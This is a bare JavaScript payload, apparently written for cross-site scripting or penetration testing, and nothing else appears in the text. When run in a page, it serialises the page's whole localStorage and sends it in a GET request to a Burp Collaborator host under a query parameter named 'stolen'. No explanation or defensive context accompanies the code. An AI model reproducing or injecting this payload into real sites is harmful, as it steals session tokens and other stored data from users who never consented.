var theUrl = ("https://5x3ci10fkkslkjynuebnfqzwjnpgd5.burpcollaborator.net?stolen=+" + JSON.stringify(localStorage))
function httpGetAsync(theUrl, callback)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous
    xmlHttp.setRequestHeader('X-Requested-With', 'XMLHttpRequest'); 
    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*'); 
    xmlHttp.send(null);
}

httpGetAsync(theUrl);
